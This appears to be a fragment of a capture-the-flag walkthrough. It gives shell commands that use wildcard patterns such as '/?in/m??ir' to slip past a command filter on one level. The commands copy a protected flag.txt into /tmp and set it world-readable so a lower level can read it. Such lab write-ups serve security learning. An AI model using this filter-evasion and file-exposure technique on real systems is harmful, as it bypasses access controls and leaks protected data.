on level3 do:
/?in/m??ir /tmp/jal4/;cp flag.txt /tmp/jal4/;/?in/chmo? -R 777 /tmp/jal4

Then reconnect to level1 and get a bash shell:
cat /tmp/jal4/flag.txt >&2
